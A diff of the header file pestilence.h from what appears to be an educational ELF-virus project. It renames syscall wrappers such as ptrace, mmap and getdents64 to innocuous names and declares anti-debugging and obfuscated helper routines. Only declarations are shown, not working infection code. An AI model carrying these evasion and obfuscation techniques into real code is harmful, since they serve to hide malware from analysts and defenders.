@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   pestilence.h                                       :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
+/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
-/*   Updated: 2026/03/02 15:36:29 by yyyyyy           ###   ########.fr       */
+/*   Updated: 2026/03/03 16:16:30 by xxxxxxx          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,8 +22,6 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
-#include "libasm.h"
-
 #define ElfW(type)	   Elf64_##type
 #define FORMAT		   2
 #define PATH_MAX	   4096
@@ -34,6 +32,7 @@
 
 /********************************* STRUCTURES *********************************/
 
+struct stat;
 typedef enum e_stat
 {
 	OK,
@@ -71,6 +70,25 @@ static int is_program_running(const char *target);
 static int is_debugged(void);
 static void signature(char str[]);
 
+static int proc_detach(void);											// ft_setsid
+static int proc_spawn(void);											// ft_fork
+static int proc_control(int request, int pid, void *addr, void *data); // ft_ptrace
+static int fs_handle(char *path, int flags, ...);						// ft_open
+static int fs_enumerate(int fd, char *buffer, int buff_size);			// ft_getdents64
+static int fs_query(const char *pathname, struct stat *statbuf);		// ft_lstat
+static int fs_release(int fd);											// ft_close
+static int vm_release(void *addr, unsigned long length);				// ft_munmap
+static void *vm_reserve(void *addr, unsigned long length, int prot, int flags, int fd,
+				 off_t offset);							   // ft_mmap
+static int vm_flush(void *addr, unsigned long length, int flags); // ft_msync
+static int io_query(int fd, struct stat *statbuf);				   // ft_fstat
+static int io_resize(int fd, off_t length);					   // ft_ftruncate
+static void *vm_resize(void *old_address, unsigned long old_size,
+				unsigned long new_size, int flags,
+				 ... );			// ft_mremap
+static void proc_terminate(int status);						// ft_exit
+static void io_send(int fd, void *buf, unsigned count);		// ft_write
+static ssize_t io_recv(int fd, const void *buf, size_t count); // ft_read
 /**
 	@brief Obfuscated version of memcmp
 */
